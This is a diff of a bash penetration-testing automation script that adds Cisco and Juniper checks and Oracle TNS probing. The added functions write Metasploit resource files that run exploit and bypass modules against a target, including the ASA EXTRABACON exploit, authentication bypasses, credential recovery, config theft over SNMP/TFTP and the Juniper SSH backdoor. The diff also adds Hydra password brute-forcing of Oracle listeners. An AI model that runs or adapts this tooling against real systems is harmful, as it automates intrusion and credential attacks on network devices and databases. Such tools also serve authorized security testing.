@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20180520 Kirby
+# 20180521 Kirby
 
 umask 077
 
@@ -31,6 +31,8 @@ function MAIN()
     local sapflag=0
     local RMIPORTS=()
     local rmiflag=0
+    local ciscoflag=0
+    local juniperflag=0
     
     export TARGET=$1 
     export RECONDIR="${HOME}/mkrecon/${TARGET}"
@@ -131,6 +133,18 @@ function MAIN()
             fi
 
             echo "examining port $port"
+
+            if [[ $service =~ cisco ]] \
+            || [[ $version =~ cisco ]] 
+            then
+                ciscoflag=1
+            fi
+        
+            if [[ $service =~ juniper ]] \
+            || [[ $version =~ juniper ]] 
+            then
+                juniperflag=1
+            fi
         
             # web
             if [[ $protocol == 'tcp' ]] \
@@ -227,10 +241,13 @@ function MAIN()
             if [[ $protocol == 'tcp' ]] \
             && [[ $service == 'oracle-tns' ]]
             then
-                echo "starting doHydra $port oracle"
+                echo "starting tnscmd10g on oracle $port"
+                echo "... outputs $RECONDIR/${TARGET}.oracle.tnscmd10g.\$port"
+                tnscmd10gScan $port &
+
+                echo "starting passHydra $port oracle"
                 echo "... outputs $RECONDIR/${TARGET}.oracle.$port.hydra"
-                doHydra $port oracle-listener /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt &
-                doHydra $port oracle-listener "$RECONDIR"/tmp/oracle-default-accounts.lst &
+                passHydra $port oracle-listener "$RECONDIR"/tmp/passwds.lst &
             fi
     
             # vnc
@@ -447,6 +464,20 @@ function MAIN()
         rmiScan &
     fi
 
+    if [[ $ciscoflag == 1 ]]
+    then
+        echo "starting ciscoScan"
+        echo "... outputs $RECONDIR/${TARGET}.cisco"
+        ciscoScan &
+    fi
+
+    if [[ $juniperflag == 1 ]]
+    then
+        echo "starting juniperScan"
+        echo "... outputs $RECONDIR/${TARGET}.juniper"
+        juniperScan &
+    fi
+
     if [[ -f "$RECONDIR"/${TARGET}.baseurls ]]
     then
         echo "starting routersploitScan"
@@ -595,7 +626,7 @@ function buildEnv()
 {
     local file
     local pkg
-    local pkgs="alien bind9-host blindelephant brutespray cewl curl dirb dnsenum dnsrecon dos2unix exif exploitdb eyewitness hydra ike-scan john joomscan jq ldap-utils libnet-whois-ip-perl libxml2-utils libwww-mechanize-perl mariadb-common metasploit-framework ncrack nikto nmap nmap-common nsis open-iscsi openvas-cli postgresql-client-common routersploit rpm rsh-client screen seclists skipfish snmpcheck wfuzz wget whatweb wpscan xmlstarlet"
+    local pkgs="alien bind9-host blindelephant brutespray cewl curl dirb dnsenum dnsrecon dos2unix exif exploitdb eyewitness hydra ike-scan john joomscan jq ldap-utils libnet-whois-ip-perl libxml2-utils libwww-mechanize-perl mariadb-common metasploit-framework ncrack nikto nmap nmap-common nsis open-iscsi openvas-cli postgresql-client-common routersploit rpm rsh-client screen seclists skipfish snmpcheck tnscmd10g wfuzz wget whatweb wpscan xmlstarlet"
 
     for pkg in $pkgs
     do
@@ -675,10 +706,6 @@ function buildEnv()
         cat "$RECONDIR"/tmp/users.tmp |dos2unix |sed -e 's/ //g' |sort -u > "$RECONDIR"/tmp/users.lst
         cat "$RECONDIR"/tmp/users.tmp "$RECONDIR"/tmp/passwds.tmp |dos2unix |sed -e 's/ //g' |sort -u > "$RECONDIR"/tmp/passwds.lst
     fi
-
-    # convert nmap's default oracle list to hydra format
-    cat /usr/share/nmap/nselib/data/oracle-default-accounts.lst |grep '/' |sed -e 's/\//:/g' \
-        > "$RECONDIR"/tmp/oracle-default-accounts.lst 
 
     rm -f "$RECONDIR"/tmp/mkrecon.txt >/dev/null 2>&1
     echo '.cvspass' >> "$RECONDIR"/tmp/mkrecon.txt
@@ -1848,11 +1875,17 @@ function fuzzURLs()
         
             if [[ $line =~ = ]] \
             && [[ ! $line =~ NONAME ]] \
-            && [[ ! $line =~ (submit) ]] \
             && [[ $url =~ http ]]
             then
-                var=$(echo $line |awk '{print $1}'|cut -d'=' -f1)=FUZZ
+                if [[ ! $line =~ (submit) ]] 
+                then
+                    var=$(echo $line |awk '{print $1}'|cut -d'=' -f1)
+                else 
+                    var=$(echo $line |awk '{print $1}'|cut -d'=' -f1)=FUZZ
+                fi
                 a_vars[${#a_vars[@]}]=$var
+
+
                 if [[ $var =~ user ]] \
                 || [[ $var =~ login ]] \
                 || [[ $var =~ name ]] 
@@ -2322,6 +2355,78 @@ function sapScan()
 ################################################################################
 
 ################################################################################
+function juniperScan()
+{
+    local msfscan
+    local cmdfile="$RECONDIR"/tmp/juniper.msf
+
+    for msfscan in auxiliary/scanner/ssh/juniper_backdoor
+    do
+        echo "use $msfscan" >> "$cmdfile"
+        echo "set RHOST $TARGET" >> "$cmdfile"
+        echo "set RHOSTS $TARGET" >> "$cmdfile"
+        echo "run" >> "$cmdfile"
+    done
+    echo "exit" >> "$cmdfile"
+
+    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.juniper >/dev/null 2>&1
+
+    return 0
+}
+################################################################################
+
+################################################################################
+function ciscoScan()
+{
+    local msfscan
+    local cmdfile="$RECONDIR"/tmp/cisco.msf
+
+    for msfscan in \
+        auxiliary/admin/cisco/cisco_asa_extrabacon \
+        auxiliary/admin/cisco/cisco_secure_acs_bypass \
+        auxiliary/admin/cisco/vpn_3000_ftp_bypass \
+        auxiliary/admin/scada/moxa_credentials_recovery \
+        auxiliary/scanner/dlsw/dlsw_leak_capture \
+        auxiliary/scanner/http/cisco_asa_asdm \
+        auxiliary/scanner/http/cisco_device_manager \
+        auxiliary/scanner/http/cisco_firepower_download \
+        auxiliary/scanner/http/cisco_firepower_login \
+        auxiliary/scanner/http/cisco_ios_auth_bypass \
+        auxiliary/scanner/http/cisco_ironport_enum \
+        auxiliary/scanner/http/cisco_nac_manager_traversal \
+        auxiliary/scanner/http/cisco_ssl_vpn \
+        auxiliary/scanner/http/cisco_ssl_vpn_priv_esc \
+        auxiliary/scanner/http/linksys_e1500_traversal \
+        auxiliary/scanner/ike/cisco_ike_benigncertain \
+        auxiliary/scanner/misc/cisco_smart_install \
+        auxiliary/scanner/snmp/cisco_config_tftp \
+        auxiliary/scanner/snmp/cisco_upload_file
+    do
+        echo "use $msfscan" >> "$cmdfile"
+        echo "set RHOST $TARGET" >> "$cmdfile"
+        echo "set RHOSTS $TARGET" >> "$cmdfile"
+        echo "run" >> "$cmdfile"
+    done
+    echo "exit" >> "$cmdfile"
+
+    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.cisco >/dev/null 2>&1
+
+    return 0
+}
+################################################################################
+
+################################################################################
+function tnscmd10gScan()
+{
+    local port=$1
+
+    tnscmd10g -h ${TARGET} -p port >"$RECONDIR"/${TARGET}.oracle.tnscmd10g.$port 2>&1
+
+    return 0
+}
+################################################################################
+
+################################################################################
 function crackers()
 {
     screen -dmS ${TARGET}.ncrack.$RANDOM -L -Logfile "$RECONDIR"/${TARGET}.ncrack \
@@ -2371,6 +2476,7 @@ function defaultCreds()
 set > /tmp/set1
 
 export PYTHONHTTPSVERIFY=0
+shopt -s nocasematch
 
 MAIN $*
 stty sane >/dev/null 2>&1
